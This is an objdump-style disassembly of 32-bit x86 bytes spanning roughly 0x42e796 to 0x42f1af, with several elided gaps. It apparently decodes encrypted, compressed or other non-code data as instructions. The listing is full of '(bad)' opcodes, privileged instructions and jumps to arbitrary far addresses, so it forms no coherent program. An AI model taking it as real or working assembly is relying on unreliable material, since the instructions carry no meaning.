  42e796:	mov    ebp,0xc8dc8205
  42e79b:	and    BYTE PTR [eax+ebx*8-0x5e],bh
  42e79f:	mov    ebx,0xc7117f1
  42e7a4:	lock lock mov esp,0x649e4afa
  42e7ab:	ret    
  42e7ac:	(bad)  [ebx-0x21]
  42e7af:	data16 rcr BYTE PTR [ecx+esi*8-0x35],1
  42e7b4:	mov    esi,ebx
  42e7b6:	jne    0x42e7ed
  42e7b8:	jb     0x42e7aa
  42e7ba:	or     al,0xdc
  42e7bc:	cmp    al,0x71
  42e7be:	cmp    dl,BYTE PTR [ebp+0xad4f531]
  42e7c4:	test   DWORD PTR [ebx],ecx
  42e7c6:	inc    edx
  42e7c7:	cmp    al,0x43
  42e7c9:	std    
  42e7ca:	sub    al,0x2b
  42e7cc:	cli    
  42e7cd:	out    0xab,al
  42e7cf:	inc    edx
  42e7d0:	outs   dx,BYTE PTR ds:[esi]
  42e7d1:	leave  
  42e7d2:	sub    eax,0x31da3c68
  42e7d7:	push   eax
  42e7d8:	jno    0x42e7a6
  42e7da:	inc    edx
  42e7db:	cmp    eax,0x6002aa15
  42e7e0:	push   ds
  42e7e1:	cmc    
  42e7e2:	test   DWORD PTR [edi],esi
  42e7e4:	dec    esi
  42e7e5:	xchg   edx,eax
  42e7e6:	mul    BYTE PTR [esp+ebp*2]
  42e7e9:	dec    esi
  42e7ea:	jmp    0xd2ad587e
  42e7ef:	lea    ecx,[ecx]
  42e7f1:	jmp    0x71e2:0x7bd0fc2a
  42e7f8:	neg    esi
  42e7fa:	pop    ss
  42e7fb:	push   ecx
  42e7fc:	scas   eax,DWORD PTR es:[edi]
  42e7fd:	mov    cl,0x4b
  42e7ff:	inc    eax
  42e800:	inc    ebx
  42e801:	cdq    
  42e802:	jg     0x42e79d
  42e804:	cmp    cl,BYTE PTR [edi]
  42e806:	xchg   esi,eax
  42e807:	push   ss
  42e808:	push   0xf9265eda
  42e80d:	ins    DWORD PTR es:[edi],dx
  42e80e:	call   0x831b:0x3e10962c
  42e815:	push   0x43
  42e817:	cdq    
  42e818:	xchg   ecx,eax
  42e819:	jmp    0xd296:0x92839f6a
  42e820:	xchg   esp,eax
  42e821:	mov    eax,0x619a8e3c
  42e826:	lea    ebx,[esi+ebp*2-0x52ff6eb8]
  42e82d:	ja     0x42e7d9
  42e82f:	test   DWORD PTR ds:0xcd805fc8,esi
	...
  42e895:	add    bl,al
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x6f6f13c3]
  42e8a3:	retf   0xc615
  42e8a6:	mov    cl,0xf2
  42e8a8:	add    DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    dh,bh
  42e8af:	cmp    al,0xa8
  42e8b1:	or     eax,0xf04a7fd8
  42e8b6:	lock int 0x5c
  42e8b9:	mov    bh,0xcc
  42e8bb:	jns    0x42e83e
  42e8bd:	rcr    DWORD PTR [eax+0x46],1
  42e8c0:	call   0x7349:0xfe5c7559
  42e8c7:	stos   DWORD PTR es:[edi],eax
  42e8c8:	push   ds
  42e8c9:	fld    DWORD PTR [ecx]
  42e8cb:	adc    dh,BYTE PTR [ebx-0x1f]
  42e8ce:	cmp    BYTE PTR [ebp-0x28e17d5f],ah
  42e8d4:	ins    DWORD PTR es:[edi],dx
  42e8d5:	and    al,0x79
  42e8d7:	imul   edx,DWORD PTR fs:[edx],0x1da588b3
  42e8de:	fistp  QWORD PTR [eax-0x58]
  42e8e1:	aad    0x21
  42e8e3:	loop   0x42e95a
  42e8e5:	out    0xcd,eax
  42e8e7:	cmp    ah,BYTE PTR [edx+0x687f0587]
  42e8ed:	lods   eax,DWORD PTR ds:[esi]
  42e8ee:	lds    ebx,FWORD PTR [esi]
  42e8f0:	cwde   
  42e8f1:	pop    esi
  42e8f2:	jle    0x42e8c6
  42e8f4:	bound  esp,QWORD PTR [edi+ebp*1+0x7a330a79]
  42e8fb:	loope  0x42e97c
  42e8fd:	and    bl,cl
  42e8ff:	pop    eax
  42e900:	and    BYTE PTR [ebx],bl
  42e902:	or     cl,BYTE PTR ds:0x3c70f4ba
  42e908:	jnp    0x42e89b
  42e90a:	lock pop ebp
  42e90c:	dec    ecx
  42e90d:	sbb    al,0xe8
  42e90f:	loop   0x42e977
  42e911:	sbb    ah,BYTE PTR [ebx+0x61]
  42e914:	ds (bad) 
  42e916:	les    esp,FWORD PTR ds:0x79680a9
  42e91c:	or     eax,0x4aae2a59
  42e921:	sub    edi,DWORD PTR [edx+0x49038b24]
  42e927:	loope  0x42e931
  42e929:	adc    eax,0x843e53cd
  42e92e:	in     al,0x69
  42e930:	sahf   
  42e931:	lock or dh,BYTE PTR [edx+edi*1+0x182699bf]
  42e939:	mov    ch,0xb2
  42e93b:	pop    esi
  42e93c:	xchg   edi,eax
  42e93d:	inc    ecx
  42e93e:	xchg   ecx,eax
  42e93f:	outs   dx,DWORD PTR ds:[esi]
  42e940:	jle    0x42e8cb
  42e942:	jnp    0x42e94f
  42e944:	jae    0x42e8d8
  42e946:	push   0x1f7dbacd
  42e94b:	xchg   BYTE PTR [ebx-0xcaff6e7],ah
  42e951:	jge    0x42e935
  42e953:	jmp    0xb43d22f2
  42e958:	jne    0x42e9c8
  42e95a:	xchg   edi,eax
  42e95b:	cdq    
  42e95c:	cmp    eax,0xbd962b49
  42e961:	push   0x1fcb97e6
  42e966:	xchg   ecx,eax
  42e967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e968:	jnp    0x42e96f
  42e96a:	push   ebp
  42e96b:	inc    esp
  42e96c:	adc    bh,bl
  42e96e:	cs push cs
  42e970:	jecxz  0x42e919
  42e972:	scas   eax,DWORD PTR es:[edi]
  42e973:	inc    edi
  42e974:	les    ecx,FWORD PTR [ebx]
  42e976:	icebp  
  42e977:	inc    esp
  42e978:	push   ebx
  42e979:	and    eax,0xe6756704
  42e97e:	lock mov esp,ebp
  42e981:	fidivr DWORD PTR [ebx]
  42e983:	xor    ch,BYTE PTR [edi]
  42e985:	out    dx,eax
  42e986:	dec    ecx
  42e987:	enter  0xaa81,0xb2
  42e98b:	xor    ecx,eax
  42e98d:	sahf   
  42e98e:	mov    edx,0xc04eee9b
  42e993:	retf   
  42e994:	stc    
  42e995:	mov    ch,0x4a
  42e997:	dec    esi
  42e998:	and    DWORD PTR [edi-0x41cf732],edi
  42e99e:	(bad)  
  42e99f:	cld    
  42e9a0:	inc    esi
  42e9a1:	scas   al,BYTE PTR es:[edi]
  42e9a2:	pop    ebp
  42e9a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9a4:	lds    ecx,FWORD PTR [ecx+0x7d]
  42e9a7:	nop
  42e9a8:	xchg   edx,eax
  42e9a9:	dec    ebp
  42e9aa:	sar    al,1
  42e9ac:	std    
  42e9ad:	add    ch,bh
  42e9af:	ds mov cl,0x16
  42e9b2:	mov    esp,0xcbed
	...
  42ea13:	add    BYTE PTR [eax],al
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	push   esi
  42ea23:	pop    ecx
  42ea24:	pop    esi
  42ea25:	jg     0x42e9df
  42ea27:	repz add DWORD PTR [eax],eax
  42ea2a:	pop    es
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [edi+0x36a263a],al
  42ea33:	dec    ebx
  42ea34:	retf   0x80
  42ea37:	shr    BYTE PTR [edi],0x7c
  42ea3a:	push   ebp
  42ea3b:	test   DWORD PTR [ecx+0xe7bc923],edi
  42ea41:	pop    ebp
  42ea42:	push   edx
  42ea43:	ss pop ebx
  42ea45:	mov    ?,edi
  42ea47:	outs   dx,DWORD PTR ds:[esi]
  42ea48:	xchg   esi,eax
  42ea49:	loopne 0x42eabe
  42ea4b:	inc    ebx
  42ea4c:	ins    BYTE PTR es:[edi],dx
  42ea4d:	mov    cl,0x94
  42ea4f:	xchg   ecx,eax
  42ea50:	add    ebx,0xffffff89
  42ea53:	pop    edi
  42ea54:	jns    0x42eac4
  42ea56:	add    eax,0xdc867b7
  42ea5b:	div    DWORD PTR [ebx+edx*2+0x494053fc]
  42ea62:	cmp    esp,ecx
  42ea64:	mov    bh,0x81
  42ea66:	xor    BYTE PTR [esi],dh
  42ea68:	push   edi
  42ea69:	adc    DWORD PTR [edx+eiz*4-0x2d9ca91a],eax
  42ea70:	dec    ebx
  42ea71:	adc    eax,0xaabb2007
  42ea76:	inc    ebp
  42ea77:	push   edx
  42ea78:	pop    eax
  42ea79:	jl     0x42eaef
  42ea7b:	sbb    edx,esp
  42ea7d:	les    ebx,FWORD PTR [edx]
  42ea7f:	arpl   dx,si
  42ea81:	inc    edx
  42ea82:	cld    
  42ea83:	xchg   ebp,eax
  42ea84:	xchg   esp,eax
  42ea85:	ds mov bh,0xa9
  42ea88:	sbb    eax,DWORD PTR [eax-0x45082bab]
  42ea8e:	fldcw  WORD PTR [ebx-0x20b7b288]
  42ea94:	pop    edx
  42ea95:	ins    BYTE PTR es:[edi],dx
  42ea96:	fstp   DWORD PTR [ecx*2+0x2886a08c]
  42ea9d:	fdiv   DWORD PTR [ebp+0x18]
  42eaa0:	inc    ebp
  42eaa1:	pop    ss
  42eaa2:	cdq    
  42eaa3:	sbb    al,0x18
  42eaa5:	jg     0x42eb17
  42eaa7:	or     BYTE PTR [esp+eiz*8],ch
  42eaaa:	shr    esi,cl
  42eaac:	jp     0x42eaa4
  42eaae:	ins    DWORD PTR es:[edi],dx
  42eaaf:	cdq    
  42eab0:	and    edx,DWORD PTR [ebp-0x44342f44]
  42eab6:	jge    0x42ea5f
  42eab8:	mul    BYTE PTR [edi]
  42eaba:	fiadd  DWORD PTR [edx+0x10347c08]
  42eac0:	jge    0x42eaf6
  42eac2:	fiadd  WORD PTR [edi]
  42eac4:	into   
  42eac5:	cmp    esi,DWORD PTR [edx+0x79]
  42eac8:	mov    bl,0xc9
  42eaca:	loop   0x42eaba
  42eacc:	sbb    ebx,DWORD PTR es:[esi+0x4691531c]
  42ead3:	push   es
  42ead4:	add    ah,BYTE PTR [ecx-0x7f043edb]
  42eada:	inc    ebp
  42eadb:	(bad)  [eax+0x23]
  42eade:	aad    0x2e
  42eae0:	scas   eax,DWORD PTR es:[edi]
  42eae1:	push   ebp
  42eae2:	test   al,0xc3
  42eae4:	ja     0x42eb5b
  42eae6:	outs   dx,BYTE PTR ds:[esi]
  42eae7:	cld    
  42eae8:	repz popf 
  42eaea:	mov    al,0x98
  42eaec:	(bad)  
  42eaed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eaee:	jp     0x42eafb
  42eaf0:	and    DWORD PTR [edi+0x558e1075],0xf802ddaa
  42eafa:	and    DWORD PTR [edx],ebx
  42eafc:	mov    al,0x5
  42eafe:	inc    ecx
  42eaff:	clc    
  42eb00:	(bad)  [ebx]
  42eb02:	mov    bl,BYTE PTR [eax+0x2]
  42eb05:	pop    ebx
  42eb06:	daa    
  42eb07:	push   ecx
  42eb08:	cli    
  42eb09:	pop    ds
  42eb0a:	pcmpeqw mm0,QWORD PTR [ebx]
  42eb0d:	cli    
  42eb0e:	add    DWORD PTR [ecx],ecx
  42eb10:	cmp    ch,BYTE PTR [ebx]
  42eb12:	inc    eax
  42eb13:	cli    
  42eb14:	xor    BYTE PTR [edi+0x33a2a900],al
  42eb1a:	dec    eax
  42eb1b:	mul    eax
  42eb1d:	scas   eax,DWORD PTR es:[edi]
  42eb1e:	stc    
  42eb1f:	xor    BYTE PTR [edx-0x6e],0x38
  42eb23:	pop    esi
  42eb24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb25:	stos   DWORD PTR es:[edi],eax
  42eb26:	and    BYTE PTR [bp-0x46b],dh
  42eb2b:	xchg   BYTE PTR [esi+0x28d64a53],al
  42eb31:	stos   BYTE PTR es:[edi],al
  42eb32:	pop    esp
  42eb33:	aam    0x56
	...
  42eb95:	add    BYTE PTR [esi+0x41],bh
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi+0x11405ada],ebp
  42eba4:	test   al,0xf
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [ebx-0x43],dh
  42ebb0:	or     edi,DWORD PTR [ecx+0x7af35158]
  42ebb6:	out    0xe9,al
  42ebb8:	mov    dl,0xd3
  42ebba:	push   ds
  42ebbb:	shr    al,0x6b
  42ebbe:	les    edi,FWORD PTR [eax*8-0x578ddc9a]
  42ebc5:	ror    BYTE PTR cs:0xe26a2ee7,0xf2
  42ebcd:	fnstenv [edx+0x13]
  42ebd0:	sar    BYTE PTR [eax-0x7b],cl
  42ebd3:	sbb    al,0x23
  42ebd5:	data16 xor al,0x2a
  42ebd8:	jbe    0x42eb8d
  42ebda:	mov    esi,0x4bff4948
  42ebdf:	aam    0xfc
  42ebe1:	stc    
  42ebe2:	push   ebx
  42ebe3:	fisubr WORD PTR [esi]
  42ebe5:	inc    ebp
  42ebe6:	ret    
  42ebe7:	leave  
  42ebe8:	mov    al,0x72
  42ebea:	dec    edi
  42ebeb:	cdq    
  42ebec:	icebp  
  42ebed:	aas    
  42ebee:	aaa    
  42ebef:	shr    DWORD PTR [eax],cl
  42ebf1:	or     eax,0xf785290f
  42ebf6:	mov    bl,BYTE PTR ds:0x749d8c0a
  42ebfc:	lock mov esi,DWORD PTR [ebx+0x3b]
  42ec00:	adc    bl,BYTE PTR [ecx]
  42ec02:	dec    edi
  42ec03:	and    eax,0x89d9e473
  42ec08:	fimul  WORD PTR [eax]
  42ec0a:	mov    ds:0x991003f3,al
  42ec0f:	leave  
  42ec10:	jmp    0x2419cf0a
  42ec15:	(bad)  
  42ec16:	jbe    0x42ebea
  42ec18:	aaa    
  42ec19:	nop
  42ec1a:	test   BYTE PTR [ecx+ebp*4+0x291d389],0x8b
  42ec22:	mov    bl,bh
  42ec24:	mov    dh,0xbb
  42ec26:	mov    edx,0x8c32e497
  42ec2b:	pop    edx
  42ec2c:	and    DWORD PTR [edx],edi
  42ec2e:	jne    0x42ec5e
  42ec30:	retf   0x6bf1
  42ec33:	pop    ebp
  42ec34:	outs   dx,DWORD PTR cs:[esi]
  42ec36:	inc    ecx
  42ec37:	dec    eax
  42ec38:	out    0x78,al
  42ec3a:	daa    
  42ec3b:	fs cmp eax,0x57dd358
  42ec41:	int    0x39
  42ec43:	sbb    BYTE PTR ds:0xd215e550,ah
  42ec49:	inc    ebx
  42ec4a:	dec    ebp
  42ec4b:	aam    0x4e
  42ec4d:	inc    edi
  42ec4e:	mov    al,ds:0xbce340b9
  42ec53:	push   es
  42ec54:	pusha  
  42ec55:	emms   
  42ec57:	iret   
  42ec58:	ds xor al,0x70
  42ec5b:	cli    
  42ec5c:	neg    BYTE PTR [edx]
  42ec5e:	ds leave 
  42ec60:	mov    ch,0x10
  42ec62:	inc    ebx
  42ec63:	test   al,0xf0
  42ec65:	mov    edi,ds
  42ec67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec68:	popf   
  42ec69:	retf   0xd3ef
  42ec6c:	jno    0x42ec7b
  42ec6e:	inc    edx
  42ec6f:	cmp    bl,BYTE PTR [eax+0x1a693f7d]
  42ec75:	ret    
  42ec76:	lods   al,BYTE PTR ds:[esi]
  42ec77:	or     ecx,DWORD PTR [esi+edx*4+0x73]
  42ec7b:	cmp    ebp,edi
  42ec7d:	mov    dh,0xb0
  42ec7f:	push   ebp
  42ec80:	lds    eax,FWORD PTR gs:[ecx]
  42ec83:	icebp  
  42ec84:	or     eax,0x50bb1d55
  42ec89:	ret    
  42ec8a:	rcl    BYTE PTR [edi],0xd9
  42ec8d:	push   es
  42ec8e:	xor    esp,DWORD PTR [esi-0x7001a655]
  42ec94:	stos   DWORD PTR es:[edi],eax
  42ec95:	pop    ss
  42ec96:	xchg   ecx,eax
  42ec97:	(bad)  
  42ec98:	cmp    eax,0xebfff5cb
  42ec9d:	adc    DWORD PTR [ecx],0x1e
  42eca0:	xor    eax,DWORD PTR fs:[ebx-0x753b81b8]
  42eca7:	call   0x1bc9:0x81b8cb32
  42ecae:	add    bh,BYTE PTR [ecx-0x23b1265]
  42ecb4:	add    BYTE PTR gs:[eax],al
	...
  42ed13:	add    BYTE PTR [eax],al
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi+0x21f0a17f]
  42ed23:	enter  0xf7d,0xc6
  42ed27:	cmc    
  42ed28:	add    DWORD PTR [eax],eax
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [ecx],dh
  42ed2f:	test   eax,0xf7378e5
  42ed34:	mov    edx,0xa605205f
  42ed39:	mov    ds:0x1ef49619,al
  42ed3e:	jo     0x42edbe
  42ed40:	jg     0x42ed7d
  42ed42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed43:	pusha  
  42ed44:	pusha  
  42ed45:	adc    eax,0xb09e4b8c
  42ed4a:	popa   
  42ed4b:	inc    ecx
  42ed4c:	push   ss
  42ed4d:	pop    esp
  42ed4e:	or     eax,0xc66a7814
  42ed53:	fwait
  42ed54:	dec    ebx
  42ed55:	(bad)  
  42ed56:	mov    edx,0xcc5e5807
  42ed5b:	sar    DWORD PTR [ecx+0x3b7ef04],1
  42ed61:	mov    ecx,0xa3fe34ac
  42ed66:	mov    bh,0xd2
  42ed68:	lahf   
  42ed69:	fdivr  st(2),st
  42ed6b:	(bad)  
  42ed6c:	in     al,dx
  42ed6d:	jmp    0x42ed34
  42ed6f:	jecxz  0x42ed36
  42ed71:	data16 outs dx,BYTE PTR ds:[esi]
  42ed73:	lea    esp,ds:0x545b58b8
  42ed79:	push   eax
  42ed7a:	sub    edx,DWORD PTR [ebp-0x4bdd1eb8]
  42ed80:	xchg   esi,eax
  42ed81:	dec    esp
  42ed82:	mov    esp,0x7b5072cf
  42ed87:	push   0xffffff80
  42ed89:	mov    ebp,0x7a3425f3
  42ed8e:	cli    
  42ed8f:	dec    edx
  42ed90:	pop    ss
  42ed91:	xchg   ecx,eax
  42ed92:	(bad)
  42ed96:	pop    eax
  42ed97:	aad    0x61
  42ed99:	out    0x5a,al
  42ed9b:	add    bh,BYTE PTR [ecx+0x18]
  42ed9e:	test   DWORD PTR [eax-0x90794],ebp
  42eda4:	(bad)  
  42eda6:	or     eax,0x4bfb5857
  42edab:	loope  0x42ed53
  42edad:	gs and eax,0xaec150f7
  42edb3:	mov    dl,al
  42edb5:	sub    ah,bl
  42edb7:	cmc    
  42edb8:	and    DWORD PTR [ecx+0x6f5f3cfb],edi
  42edbe:	shl    esi,1
  42edc0:	cmp    ch,0xcc
  42edc3:	into   
  42edc4:	fild   WORD PTR [ecx-0x68]
  42edc7:	cmp    bh,al
  42edc9:	les    ebp,FWORD PTR [ebx-0xc]
  42edcc:	xchg   esi,eax
  42edcd:	xor    al,0x1a
  42edcf:	loopne 0x42ed88
  42edd1:	in     al,0x72
  42edd3:	cvtps2pd xmm0,QWORD PTR [edx+0x60726d2f]
  42edda:	sahf   
  42eddb:	cmp    eax,DWORD PTR [ebx+0x6540d1dd]
  42ede1:	or     edi,DWORD PTR [ecx-0x2]
  42ede4:	adc    ebp,DWORD PTR [edi-0x513a98b7]
  42edea:	mov    eax,ds:0xeadcce3b
  42edef:	cmp    BYTE PTR [ebx],0x7f
  42edf2:	adc    eax,edi
  42edf4:	mov    eax,0x950f4573
  42edf9:	mov    bh,0x34
  42edfb:	test   al,0xf6
  42edfd:	xchg   BYTE PTR [edx+0x21],bl
  42ee00:	dec    esi
  42ee01:	mul    dl
  42ee03:	sub    BYTE PTR ds:0xd3941771,ah
  42ee09:	jmp    0x18df:0xc9a12488
  42ee10:	pop    edx
  42ee11:	or     BYTE PTR [edx-0x55041f8c],dl
  42ee17:	dec    edx
  42ee18:	mov    ebp,0x29a1e413
  42ee1d:	push   ecx
  42ee1e:	aaa    
  42ee1f:	sbb    eax,0xb6e6a61c
  42ee24:	dec    ebp
  42ee25:	lds    ebp,FWORD PTR [edi+0x3cecb574]
  42ee2b:	cmp    DWORD PTR [esi],0x35f4414f
  42ee31:	jne    0x42ee27
  42ee33:	xchg   ecx,eax
  42ee34:	mov    BYTE PTR [eax],0x0
	...
  42ee93:	add    BYTE PTR [eax],al
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0xfc35f479,edi
  42eea4:	jmp    0x700:0x1f6cd13
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    BYTE PTR [edx+0x1],cl
  42eeb0:	inc    edi
  42eeb1:	jp     0x42eea7
  42eeb3:	inc    esp
  42eeb4:	(bad)  
  42eeb5:	fmul   DWORD PTR [esi+0x55993b5d]
  42eebb:	sar    BYTE PTR [edx+0x6c],0x60
  42eebf:	cdq    
  42eec0:	popa   
  42eec1:	pop    eax
  42eec2:	or     DWORD PTR [eax+0x34],0x9abddb91
  42eec9:	mov    ss,WORD PTR [edi]
  42eecb:	loop   0x42eedf
  42eecd:	mov    ds:0xcfa41233,eax
  42eed2:	(bad)
  42eed5:	mov    cl,0xf6
  42eed7:	retf   
  42eed8:	hlt    
  42eed9:	ja     0x42ef04
  42eedb:	mov    bl,BYTE PTR [ebp-0x2b8656b0]
  42eee1:	xor    BYTE PTR [ebx+ecx*1],ch
  42eee4:	inc    ecx
  42eee5:	mov    ds:0xa55f5838,al
  42eeea:	fsub   DWORD PTR [ebx-0x44]
  42eeed:	cs xchg edx,eax
  42eeef:	es ins DWORD PTR es:[edi],dx
  42eef1:	adc    BYTE PTR ds:0x51679828,al
  42eef7:	cs fwait
  42eef9:	cmp    BYTE PTR [ecx],0x80
  42eefc:	inc    ebx
  42eefd:	xlat   BYTE PTR ds:[ebx]
  42eefe:	xchg   cl,ah
  42ef00:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef03:	in     al,dx
  42ef04:	in     al,dx
  42ef05:	aam    0xb
  42ef07:	adc    al,0xc8
  42ef09:	add    BYTE PTR [edi],dl
  42ef0b:	pop    edx
  42ef0c:	dec    ebx
  42ef0d:	push   ebp
  42ef0e:	xchg   DWORD PTR [ecx+0x68],ecx
  42ef11:	mov    al,bl
  42ef13:	mov    ds:0xc4984fb0,eax
  42ef18:	xor    DWORD PTR [ebx-0x4e1e8c6f],edx
  42ef1e:	jb     0x42ef8a
  42ef20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef21:	loop   0x42eeb3
  42ef23:	mov    edx,0xd87b0d80
  42ef28:	ins    DWORD PTR es:[edi],dx
  42ef29:	jno    0x42ef8c
  42ef2b:	leave  
  42ef2c:	jmp    0xde4494a3
  42ef31:	test   BYTE PTR [ebx-0x2851ede4],0xe2
  42ef38:	jg     0x42ef7e
  42ef3a:	lock mov esi,0x8be448bd
  42ef40:	ret    
  42ef41:	retf   
  42ef42:	jg     0x42eecc
  42ef44:	add    ebx,esp
  42ef46:	popf   
  42ef47:	nop
  42ef48:	cs sti 
  42ef4a:	les    eax,FWORD PTR [ebx-0x6b]
  42ef4d:	fnstenv [esi+0x6c333787]
  42ef53:	adc    ebx,edx
  42ef55:	push   edx
  42ef56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef57:	xchg   ecx,eax
  42ef58:	jge    0x42ef9c
  42ef5a:	cs add eax,0x4fd576d3
  42ef60:	(bad)  
  42ef61:	loopne 0x42eef5
  42ef63:	sti    
  42ef64:	push   edx
  42ef65:	call   FWORD PTR [ebx+ebx*1+0x14]
  42ef69:	jns    0x42efbb
  42ef6b:	cs cli 
  42ef6d:	push   es
  42ef6e:	(bad)  
  42ef70:	sub    al,0xbf
  42ef72:	sbb    eax,0x7e542b2a
  42ef77:	test   eax,0xe40d4e2e
  42ef7c:	call   0xb0c9535d
  42ef81:	inc    ebp
  42ef82:	sbb    eax,0x9e52f023
  42ef87:	pop    ebp
  42ef88:	and    al,BYTE PTR [esi-0x1cbf917a]
  42ef8e:	and    al,0x9f
  42ef90:	push   cs
  42ef91:	ja     0x42efc6
  42ef93:	out    dx,al
  42ef94:	aam    0x2e
  42ef96:	nop
  42ef97:	jne    0x42efe8
  42ef99:	jne    0x42ef1c
  42ef9b:	xchg   edi,eax
  42ef9c:	je     0x42ef66
  42ef9e:	fsubr  DWORD PTR [edi+0x7b2672e3]
  42efa4:	xor    eax,0x4644c39
  42efa9:	dec    ecx
  42efaa:	inc    ecx
  42efab:	mov    ds:0x3041f4a2,al
  42efb0:	xchg   ebx,eax
  42efb1:	ss jmp 0x42ef5d
  42efb4:	add    BYTE PTR [bx+si],al
	...
  42f013:	add    BYTE PTR [eax],al
  42f015:	add    BYTE PTR [edx],dl
  42f017:	ds int 0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0xdb4ad516
  42f024:	fsubr  QWORD PTR [esp+edx*8-0x9]
  42f028:	add    DWORD PTR [eax],eax
  42f02a:	pop    es
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    dl,cl
  42f02f:	pop    ecx
  42f030:	or     BYTE PTR [esi],al
  42f032:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42f034:	fs retf 
  42f036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f037:	mov    eax,ds:0xda1df108
  42f03c:	idiv   DWORD PTR [edi+0x3f]
  42f03f:	ss pop ss
  42f041:	xchg   eax,ebx
  42f043:	cdq    
  42f044:	aam    0x97
  42f046:	add    dl,bl
  42f048:	loope  0x42f09c
  42f04a:	or     eax,0x2eb205df
  42f04f:	inc    ecx
  42f050:	inc    edi
  42f051:	int    0xe7
  42f053:	push   ecx
  42f054:	sbb    BYTE PTR [eax+0x3d],0xf4
  42f058:	mov    esi,0xa3940895
  42f05d:	xor    BYTE PTR [edi+0x21],0x6b
  42f061:	mov    cl,0x61
  42f063:	into   
  42f064:	pop    ebx
  42f065:	jnp    0x42f080
  42f067:	xchg   edx,eax
  42f068:	dec    eax
  42f069:	sbb    eax,0xbe3e7e64
  42f06e:	aas    
  42f06f:	in     al,dx
  42f070:	shl    DWORD PTR [ecx+eax*8-0x7a],0xeb
  42f075:	jge    0x42f0cd
  42f077:	pop    es
  42f078:	test   eax,0x25ab7541
  42f07d:	test   BYTE PTR [edi],al
  42f07f:	push   ebp
  42f080:	std    
  42f081:	bound  esp,QWORD PTR [ebx+0x68114985]
  42f087:	popa   
  42f088:	cmc    
  42f089:	mov    ah,0x41
  42f08b:	popa   
  42f08c:	sbb    DWORD PTR ds:0xc472aa26,ebp
  42f092:	mov    DWORD PTR [edi-0x4],ebp
  42f095:	test   eax,0xe52b20ff
  42f09a:	test   eax,0x967f31e6
  42f09f:	fsubr  DWORD PTR ds:0x97302870
  42f0a5:	cld    
  42f0a6:	stos   BYTE PTR es:[edi],al
  42f0a7:	loopne 0x42f0f6
  42f0a9:	(bad)
  42f0ac:	and    DWORD PTR [edi],ebp
  42f0ae:	sub    esp,DWORD PTR [edi-0x4de783c]
  42f0b4:	mov    ebx,0x3c41679b
  42f0b9:	in     eax,dx
  42f0ba:	xor    eax,0x8504b00c
  42f0bf:	sub    DWORD PTR [ebp+esi*2+0x5a],0x6dc1e3a0
  42f0c7:	repnz xchg ebp,eax
  42f0c9:	repz mov ax,ds:0x5027451
  42f0d0:	test   DWORD PTR [eax],edi
  42f0d2:	(bad)  
  42f0d3:	and    dh,dl
  42f0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f0d6:	addr16 jne 0x42f0a6
  42f0d9:	adc    ecx,DWORD PTR ds:0x15107dc
  42f0df:	fild   QWORD PTR [ebx+ebp*2-0x41b1c894]
  42f0e6:	cmp    esp,DWORD PTR [edx-0x19e75905]
  42f0ec:	lea    ebx,[ebx+0x2136e399]
  42f0f2:	sbb    ch,BYTE PTR [edi+0xf]
  42f0f5:	pop    edi
  42f0f6:	xor    DWORD PTR ds:0x14a962b3,0xffffff98
  42f0fd:	sti    
  42f0fe:	adc    esi,esi
  42f100:	jmp    0x975a9f0f
  42f105:	inc    esi
  42f106:	push   edx
  42f107:	adc    BYTE PTR [edi-0x66],bh
  42f10a:	mov    ecx,0xe7dff54e
  42f10f:	int3   
  42f110:	inc    edi
  42f111:	pop    es
  42f112:	fs xchg edi,eax
  42f114:	in     eax,0x7
  42f116:	out    dx,al
  42f117:	fld    TBYTE PTR [edi+0x3041130e]
  42f11d:	into   
  42f11e:	inc    eax
  42f11f:	outs   dx,DWORD PTR ds:[esi]
  42f120:	mov    ds:0x6e482667,al
  42f125:	mov    DWORD PTR [ebx-0x6862f34],0x93f1e34b
  42f12f:	(bad)  
  42f130:	fisttp QWORD PTR [edi+0x11fcd6]
	...
  42f196:	pop    edx
  42f197:	es jecxz 0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f17e
  42f1a3:	(bad)  
  42f1a4:	rcl    BYTE PTR [ebx+ebx*8],1
  42f1a7:	clc    
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    al,bl
  42f1af:	data16 jg 0x42f16e
